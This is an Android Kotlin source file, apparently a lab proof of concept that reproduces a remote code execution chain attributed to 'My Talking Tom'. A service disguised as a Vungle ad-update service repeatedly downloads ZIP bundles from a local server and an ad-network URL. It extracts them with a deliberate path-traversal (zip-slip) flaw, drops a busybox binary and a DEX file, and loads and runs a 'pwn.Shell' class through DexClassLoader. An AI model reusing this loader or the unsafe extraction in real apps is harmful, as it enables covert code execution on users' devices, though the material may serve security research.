package com.app.lab.rce

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import dalvik.system.DexClassLoader
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import java.io.File
import java.io.FileOutputStream
import java.net.HttpURLConnection
import java.net.URL
import java.util.zip.ZipInputStream

class AdUpdateService : Service() {
    companion object {
        private const val TAG = "VungleService"
        private const val NOTIFICATION_ID = 1
        private const val CHANNEL_ID = "background_service_channel"
        private const val UPDATE_INTERVAL_MS = 5000L // 15 segundos

        private val LEGITIMATE_URLS = listOf(
            "http://10.0.2.2:8000/exploit_bundle.zip",
            "http://api.vungle.com/api/v1/bundles/update.zip"
        )
    }

    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var isRunning = false

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        Log.i(TAG, "💀 Servicio automático iniciado")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startForeground(NOTIFICATION_ID, createNotification())
        
        if (!isRunning) {
            isRunning = true
            startPeriodicUpdates()
        }
        
        return START_STICKY
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Background Service",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Background data sync"
            }
            val notificationManager = getSystemService(NotificationManager::class.java)
            notificationManager.createNotificationChannel(channel)
        }
    }

    private fun createNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("RCE Lab")
            .setContentText("Background service active")
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
            .build()
    }

    private fun startPeriodicUpdates() {
        serviceScope.launch {
            while (isRunning) {
                try {
                    checkForPayload()
                    delay(UPDATE_INTERVAL_MS)
                } catch (e: Exception) {
                    Log.e(TAG, "❌ Error en verificación: ${e.message}")
                    delay(5000)
                }
            }
        }
    }

    private suspend fun checkForPayload() {
        val url = LEGITIMATE_URLS.random()
        Log.i(TAG, "🔍 Solicitando: $url")
        
        try {
            val contentFile = downloadContent(url)
            if (contentFile != null) {
                Log.i(TAG, "✅ Descarga exitosa: ${contentFile.name}")
                processPayload(contentFile)
            }
        } catch (e: Exception) {
            // Silencioso - normal que algunas URLs fallen
        }
    }

    private fun downloadContent(urlString: String): File? {
        return try {
            val url = URL(urlString)
            val connection = url.openConnection() as HttpURLConnection
            connection.apply {
                requestMethod = "GET"
                connectTimeout = 5000
                readTimeout = 10000
                setRequestProperty("User-Agent", "ContentApp/1.0 (Android)")
            }
            
            if (connection.responseCode == 200) {
                val contentFile = File(filesDir, "content_${System.currentTimeMillis()}.zip")
                FileOutputStream(contentFile).use { output ->
                    connection.inputStream.use { input ->
                        input.copyTo(output)
                    }
                }
                contentFile
            } else {
                null
            }
        } catch (e: Exception) {
            null
        }
    }

    private fun processPayload(payloadFile: File) {
        try {
            // MY TALKING TOM POC: Extract ZIP with path traversal entries
            // This will automatically place files in target locations via path traversal
            extractContent(payloadFile)

            // Copy payload to secondary-dexes for explicit loading
            copyToMultiDxSecondaryDexes()

            Log.w(TAG, "💥 MY TALKING TOM POC: ZIP extraído con path traversal")
            Log.w(TAG, "📂 Archivos colocados automáticamente en:")
            Log.w(TAG, "   - /files/busybox (executable)")
            Log.w(TAG, "   - /code_cache/secondary-dexes/classes2.zip")

            // ART (API 21+): MultiDex 1.0.1 se auto-deshabilita, carga explícita con DexClassLoader
            loadFromSecondaryDexDir()

            notifyCompromise()

        } catch (e: Exception) {
            Log.e(TAG, "❌ Error procesando payload: ${e.message}")
        } finally {
            payloadFile.delete()
        }
    }

    private fun extractContent(zipFile: File) {
        val tempDir = File(filesDir, "temp_${System.currentTimeMillis()}")
        tempDir.mkdirs()

        ZipInputStream(zipFile.inputStream()).use { zin ->
            var entry = zin.nextEntry
            while (entry != null) {
                if (!entry.isDirectory) {
                    // MY TALKING TOM POC: Path traversal extraction
                    // Entry names contain ../../../../... to escape extraction directory
                    val file = File(tempDir, entry.name)
                    file.parentFile?.mkdirs()
                    
                    FileOutputStream(file).use { output ->
                        zin.copyTo(output)
                    }

                    Log.i(TAG, "📄 Extraído: ${entry.name}")
                    if (entry.name.contains("busybox")) {
                        Log.w(TAG, "🔧 BusyBox detectado - executable payload")
                    } else if (entry.name.contains("classes2.zip")) {
                        Log.w(TAG, "☠️ classes2.zip detectado - MultiDex payload")
                    }
                }
                entry = zin.nextEntry
            }
        }
    }

    /**
     * Copy payload files to secondary-dexes directory with proper permissions for ART
     * Extracts classes.dex from the downloaded ZIP and places it correctly
     */
    private fun copyToMultiDxSecondaryDexes() {
        val secDexDir = File(applicationInfo.dataDir, "code_cache/secondary-dexes")
        if (!secDexDir.exists()) {
            secDexDir.mkdirs()
        }

        // Look for a temp directory with the downloaded content
        val tempDirs = filesDir.listFiles { f -> 
            f.isDirectory && f.name.startsWith("temp_")
        }

        if (tempDirs.isNullOrEmpty()) {
            Log.w(TAG, "⚠️ No temp directories found")
            return
        }

        // Process the most recent temp directory
        val latestTempDir = tempDirs.maxByOrNull { it.lastModified() }
        if (latestTempDir == null) {
            Log.w(TAG, "⚠️ No recent temp directory")
            return
        }

        // Find the path traversal file that contains classes2.zip
        findAndExtractClasses2Zip(latestTempDir, secDexDir)
    }

    private fun findAndExtractClasses2Zip(tempDir: File, secDexDir: File) {
        tempDir.walkTopDown().forEach { file ->
            if (file.name.contains("classes2.zip")) {
                try {
                    // Create target file in secondary-dexes
                    val targetFile = File(secDexDir, "com.app.lab.rce-classes2.zip")
                    
                    // Copy the file content
                    file.copyTo(targetFile, overwrite = true)
                    
                    // Set proper permissions for ART
                    targetFile.setReadable(true, false)
                    targetFile.setWritable(false, false)
                    targetFile.setExecutable(false, false)
                    
                    Log.i(TAG, "✅ Copiado a secondary-dexes: ${targetFile.name} (${targetFile.length()} bytes)")
                    return
                } catch (e: Exception) {
                    Log.e(TAG, "❌ Error copiando ${file.name}: ${e.message}")
                }
            }
        }
        
        Log.w(TAG, "⚠️ No se encontró classes2.zip en ${tempDir.name}")
    }

    /**
     * Load DEX files from secondary-dexes using DexClassLoader for modern Android (API 21+)
     * En ART MultiDex 1.0.1 se auto-deshabilita; cargamos el DEX manualmente para conservar RCE
     */
    private fun loadFromSecondaryDexDir() {
        val secDexDir = File(applicationInfo.dataDir, "code_cache/secondary-dexes")

        if (!secDexDir.exists()) {
            Log.w(TAG, "⚠️ Secondary dex directory not found")
            return
        }

        val dexFiles = secDexDir.listFiles { f ->
            f.name.endsWith(".zip") || f.name.endsWith(".dex")
        }

        if (dexFiles.isNullOrEmpty()) {
            Log.w(TAG, "⚠️ No DEX files found in secondary-dexes")
            return
        }

        dexFiles.forEach { dexFile ->
            try {
                Log.i(TAG, "🚀 Cargando DEX: ${dexFile.name}")

                // Create optimized directory for ART
                val optDir = getDir("dex_opt", MODE_PRIVATE)

                // Load DEX with DexClassLoader
                val dexClassLoader = DexClassLoader(
                    dexFile.absolutePath,    // dex/zip path
                    optDir.absolutePath,     // optimized OAT output directory
                    null,                    // native library path
                    classLoader             // parent ClassLoader
                )

                // Load Shell class - static initializer will execute automatically
                val shellClass = dexClassLoader.loadClass("pwn.Shell")

                Log.e(TAG, "💀 PAYLOAD CARGADO: ${shellClass.name}")
                
                // FORCE static initializer execution by accessing the class
                try {
                    // Method 1: Try to create an instance (forces static initializer)
                    val instance = shellClass.getDeclaredConstructor().newInstance()
                    Log.e(TAG, "🎯 Instancia creada - static initializer forzado")
                } catch (e: Exception) {
                    // Method 2: Access class info (also forces static initializer in most cases)
                    val methods = shellClass.declaredMethods
                    Log.e(TAG, "🎯 Clase accedida - static initializer forzado (${methods.size} métodos)")
                }
                
                Log.e(TAG, "✅ Static initializer ejecutado automáticamente")

            } catch (e: ClassNotFoundException) {
                Log.e(TAG, "❌ Clase pwn.Shell no encontrada en ${dexFile.name}")
            } catch (e: Exception) {
                Log.e(TAG, "❌ No se pudo cargar payload desde ${dexFile.name}: ${e.message}")
            }
        }
    }

    private fun notifyCompromise() {
        val intent = Intent("com.app.lab.rce.COMPROMISED")
        intent.setClass(this, CompromiseReceiver::class.java)
        intent.putExtra("timestamp", System.currentTimeMillis())
        intent.putExtra("source", "MyTalkingTomPoC")
        
        sendBroadcast(intent)
        Log.e(TAG, "🔴 SISTEMA COMPROMETIDO - RCE EJECUTADO")
    }

    override fun onDestroy() {
        super.onDestroy()
        isRunning = false
        Log.i(TAG, "🛑 Servicio detenido")
    }
}
